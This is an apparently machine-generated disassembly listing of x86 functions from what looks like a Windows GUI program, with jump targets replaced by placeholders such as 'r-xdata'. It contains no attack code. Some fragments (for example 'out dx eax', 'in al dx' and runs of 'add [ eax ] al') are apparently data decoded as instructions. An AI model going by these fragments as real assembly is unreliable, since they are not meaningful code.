mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_44fb04
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_44d530
pop esi
retn
sub_44fbc8
push esi
mov si 0xffc1
call sub_403450
pop esi
retn
sub_44fbf4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44fc08
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44fc1c
call sub_44d4f0
retn
sub_44fc24
call sub_44d4f0
retn
sub_44fc2c
call sub_44d4f0
retn
sub_44fcd4
push ebx
mov ebx eax
mov eax ebx
call sub_44bb88
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_423c94
mov dx 0xb009
mov eax ebx
call sub_44d530
pop ebx
retn
sub_44fe38
call sub_44d4f0
retn
sub_44fe40
call sub_44d4f0
retn
sub_44fe48
call sub_44d4f0
retn
sub_44fe50
call sub_44d4f0
retn
sub_44feb4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_45034a
jmp sub_4039a8
sub_450351
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450430
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_4505d4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
mov eax [ eax + 0x190 ]
retn
mov eax edx
call sub_4507d8
retn
sub_4505ec
jmp r-xdata
mov edx [ eax + 0x30 ]
test edx edx
jne r-xdata
mov eax edx
mov edx [ eax + 0x190 ]
test edx edx
jne r-xdata
mov eax edx
retn
call sub_4507d8
mov edx eax
sub_45060c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_44b16c
retn
sub_4506ac
push ebx
mov ebx eax
mov eax ebx
call sub_450adc
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_4506c8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_4508a0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4507d8
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_4508f8
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44b16c
sub_450918
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_44b16c
sub_45093c
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_450948
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_44b16c
sub_4509f4
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_450998
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_450ad0
jmp sub_4039a8
sub_450ad7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450cf6
jmp sub_4039a8
sub_450cfd
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_450e04
call sub_44af3c
retn
sub_451252
jmp sub_4039a8
sub_4512e8
mov eax [ r-xdata ]
retn
sub_45144f
jmp sub_4039a8
sub_451560
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44b16c
sub_451580
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44b16c
sub_451896
jmp sub_4039a8
sub_4519d8
test [ eax + 0x52 ] 0x4
setne al
retn
sub_451b34
jmp sub_4039a8
sub_451b3b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_42446c
retn
sub_451b57
jmp sub_4039a8
sub_451b64
retn
sub_451c38
mov [ edx + 0xc ] 0xffffffff
retn
sub_451c96
jmp sub_4039a8
sub_451c9d
pop ecx
pop ecx
pop ebp
retn
sub_451d3d
jmp sub_4039a8
sub_451d44
pop ebx
mov esp ebp
pop ebp
retn
sub_451db0
call sub_44dcf8
retn
sub_451e43
jmp sub_4039a8
sub_451e4a
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_452029
jmp sub_4039a8
sub_452030
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45218c
push ebx
mov ebx eax
mov eax ebx
call sub_457154
or edx 0xffffffff
mov eax ebx
call sub_4522b8
pop ebx
retn
sub_452264
jmp sub_4039a8
sub_4522b8
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_4521a4
sub_452428
push ebx
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_452440
push ebx
mov ebx eax
mov eax ebx
call sub_45720c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_45252c
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_44e930
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_4525c7
jmp sub_4039a8
sub_4525ce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4525f1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_42446c
retn
sub_4525ea
jmp sub_4039a8
sub_4525f1
pop ebx
pop ecx
pop ebp
retn
sub_4525f8
retn
sub_452660
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_4529cd
jmp sub_4039a8
sub_452bb4
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_452da0
jmp sub_4039a8
sub_452e50
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_452e64
inc [ eax + 0x6c ]
retn
sub_452e68
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_4546e8
sub_452fc8
call sub_4536c8
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_453973
jmp sub_4039a8
sub_45397a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453997
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_453990
jmp sub_4039a8
sub_453997
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453c78
jmp sub_4039a8
sub_453c7f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453c9c
mov eax [ ebp - 0x4 ]
call sub_42446c
retn
sub_453c95
jmp sub_4039a8
sub_453c9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453cb9
mov eax [ ebp - 0x4 ]
call sub_403254
retn
sub_453cb2
jmp sub_4039a8
sub_453cb9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45416d
jmp sub_4039a8
sub_454174
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4542ff
jmp sub_4039a8
sub_454306
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4543bb
jmp sub_4039a8
sub_4543c2
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4544b0
jmp sub_4039a8
sub_454501
jmp sub_4039a8
sub_454508
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4545c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452ed4
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_454710
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_452a10
sub_455010
jmp sub_4039a8
sub_455017
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4550e0
call GetCapture
retn
sub_4550e8
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40d2c8
pop ebx
retn
sub_4550f8
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_45535e
jmp sub_4039a8
sub_455558
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_45576c
jmp sub_4039a8
sub_455773
pop ebx
mov esp ebp
pop ebp
retn
sub_4557be
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_45583b
jmp sub_4039a8
sub_455842
pop ebp
retn
sub_4558ca
jmp sub_4039a8
sub_4558d1
pop ebp
retn
sub_45597e
out dx eax
push edx
push ecx
[ ecx ]
sub_455eda
out dx eax
jmp [ esp + ebp * 2 + 0x6ccc0045 ]
sub_456020
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_41a62c
retn
sub_456038
mov al 0x1
retn
sub_45603c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_4203f4
retn
mov eax edx
retn
sub_45604c
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_4203c4
retn
mov al 0x1
retn
sub_45633c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a5d0
pop esi
pop ebx
retn
sub_456350
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_45638c
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4565f0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
pop ebx
retn
sub_456604
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
pop ebx
retn
sub_456618
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
pop ebx
retn
sub_45662c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
pop ebx
retn
sub_456640
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
pop ebx
retn
sub_456654
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
pop ebx
retn
sub_456668
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
pop ebx
retn
sub_45667c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
pop ebx
retn
sub_456690
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
pop ebx
retn
sub_4566a4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
pop ebx
retn
sub_4566b8
retn
sub_4566bc
retn
sub_4566c0
retn
sub_4566c4
retn
sub_4566c8
retn
sub_4566cc
retn
sub_4566d0
retn
sub_4566d4
retn
sub_4566d8
retn
sub_4566dc
retn
sub_4566e0
retn
sub_4566e4
retn
sub_456990
jmp sub_4039a8
sub_456d2c
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x90 ] eax
sub_456d54
push esi
mov si 0xffef
call sub_403450
pop esi
retn
sub_456df5
jmp sub_4039a8
sub_456dfc
pop ebp
retn
sub_456e00
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
sub_457028
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_457201
jmp sub_4039a8
sub_457208
pop ebx
pop ecx
pop ebp
retn
sub_45720c
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_457214
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_45747c
sub_4572c1
jmp sub_4039a8
sub_4572c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403254
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_4573d0
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_45750f
jmp sub_4039a8
sub_457516
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4575ae
jmp sub_4039a8
sub_4575b5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4575d2
mov eax [ ebp - 0xc ]
call sub_403254
retn
sub_4575cb
jmp sub_4039a8
sub_4575d2
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403450
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4576a9
jmp sub_4039a8
sub_4576e7
jmp sub_4039a8
sub_4576ee
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403450
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4578b3
jmp sub_4039a8
sub_4578ba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4578d7
mov eax [ ebp - 0xc ]
call sub_403254
retn
sub_4578d0
jmp sub_4039a8
sub_4578d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_457950
retn
sub_4578f0
jmp sub_4039a8
sub_45793f
jmp sub_4039a8
sub_457946
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4579cf
jmp sub_4039a8
sub_4579d6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4579dc
or edx 0xffffffff
call sub_457950
retn
sub_457deb
jmp sub_4039a8
sub_457df2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e0f
mov eax [ ebp - 0xc ]
call sub_403254
retn
sub_457e08
jmp sub_4039a8
sub_457e0f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e2c
mov eax [ ebp - 0x4 ]
call sub_458924
retn
sub_457e25
jmp sub_4039a8
sub_457e2c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458030
jmp sub_4039a8
sub_458037
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45803c
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403450
sub_458054
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_419174
pop ebx
retn
sub_4580f8
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_41a474
sub_45820f
jmp sub_4039a8
sub_458216
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403254
retn
sub_45822c
jmp sub_4039a8
sub_45853e
jmp sub_4039a8
sub_458545
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458562
mov eax [ ebp - 0x10 ]
call sub_403254
retn
sub_45855b
jmp sub_4039a8
sub_458562
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45857f
mov eax [ ebp - 0x8 ]
call sub_403254
retn
sub_458578
jmp sub_4039a8
sub_45857f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4585e8
jmp sub_4039a8
sub_458701
jmp sub_4039a8
sub_45871e
jmp sub_4039a8
sub_4588d6
jmp sub_4039a8
sub_4588dd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458920
inc [ eax + 0x5c ]
retn
sub_458924
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403450
sub_458978
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4589b5
jmp sub_4039a8
sub_4589bc
pop ebp
retn
sub_4589c0
sub [ rw-data ] 0x1
retn
sub_458e12
in al dx
enter 0x45 0xec
retn 0x45
sub_458e1a
mov esp 0xf40045c3
retn
sub_4590bf
cmp al 0xc3
inc ebp
add [ eax ] dl

sub_4598cb
jmp [ eax + eax ]
sub_459928
mov eax [ esp + 0x8 ]
retn
sub_459930
push ebx
mov ebx eax
call sub_459928
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
jmp sub_4039e0
sub_45994c
pop ebx
retn
sub_459bc5
jmp sub_4039a8
sub_459bcc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459d17
jmp sub_4039a8
sub_459d1e
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459d34
push ebx
mov eax [ rw-data ]
call sub_41ab24
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41aae0
mov eax ebx
pop ebx
retn
sub_459ebc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403404
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_459ed8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_45a5d3
jmp sub_4039a8
sub_45a5da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a6d2
jmp sub_4039a8
sub_45a6d9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45aafc
jmp sub_4039a8
sub_45ab03
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45afaf
jmp sub_4039a8
sub_45b450
jmp sub_4039a8
sub_45b457
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b8bb
jmp sub_4039a8
sub_45bd78
jmp sub_4039a8
sub_45bd7f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45c12a
jmp sub_4039a8
sub_45c131
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45c13f
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45c2ec
mov eax [ r-xdata ]
retn
sub_45c328
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45c33c
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45c34c
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45c35c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_45c658
mov edx eax
sub_45c3f4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403404
mov edx esi
call sub_45c374
pop esi
pop ebx
retn
sub_45c470
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_45c658
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_41a62c
mov ecx eax
sub_45c848
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_45c8b0
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_45cc58
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45cc8c
sub_45cc8c
mov edx sub_45cc64
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_459db4
retn
sub_45ce76
jmp sub_4039a8
sub_45ce7d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d314
jmp sub_4039a8
sub_45d353
jmp sub_4039a8
sub_45d35a
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d4f8
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45d634
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403450
pop esi
pop ebp
retn 0x8
sub_45d650
mov eax [ eax + 0x34 ]
call sub_45a888
retn
sub_45d65c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403450
pop esi
retn
sub_45d698
push ebx
mov ecx sub_45d670
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_459db4
pop ebx
retn
sub_45d8cc
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45d8e0
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_45da15
jmp sub_4036f4
sub_45db17
jmp sub_4039a8
sub_45db42
jmp sub_4039a8
sub_45db49
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45db60
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_45dd48
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_45d698
sub_45ddc8
jmp sub_4039a8
sub_45de0c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45de24
push ebx
mov ebx eax
mov eax ebx
call sub_420414
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45de76
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_45d698
sub_45deec
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45e035
jmp sub_4039a8
sub_45e03c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45e27c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45e28c
sub_45e2e0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_45e2f0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_45e300
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_45e310
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_45e320
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_45e398
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45a6e0
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_45a6e0
retn
sub_45e3b4
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45a6e0
sub_45e3fc
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_45d650
retn
mov eax edx
retn
sub_45e4a8
mov [ eax + 0x58 ] edx
call sub_45e3d0
retn
sub_45e4de
jmp sub_4036f4
sub_45e4e3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46ad0c
call sub_403a5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e849
jmp sub_4039a8
sub_45e850
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403254
retn
sub_45e866
jmp sub_4039a8
sub_45e967
jmp sub_4039a8
sub_45e96e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e98b
mov eax [ ebp - 0x14 ]
call sub_403254
retn
sub_45e984
jmp sub_4039a8
sub_45e9a9
jmp sub_4039a8
sub_45ea33
jmp sub_4039a8
sub_45ea3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ea6c
push ebx
mov ebx eax
mov eax ebx
call sub_41a714
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_4211c4
sub_45eb30
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_45eb44
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_45eb4c
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_45ef11
jmp sub_4039a8
sub_45ef18
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f018
jmp sub_4039a8
sub_45f01f
pop ebp
retn
sub_4613b8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
adc eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_461920
mov eax [ rw-data ]
retn
sub_461928
mov [ rw-data ] eax
retn
sub_461a70
jmp sub_4036f4
sub_461aa7
jmp sub_4039a8
sub_461aae
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461db6
jmp sub_4039a8
sub_461dbd
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_461e61
jmp sub_4039a8
sub_461e68
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461ef8
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_462624
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_462cd0
sub_462640
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_462624
sub_462760
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
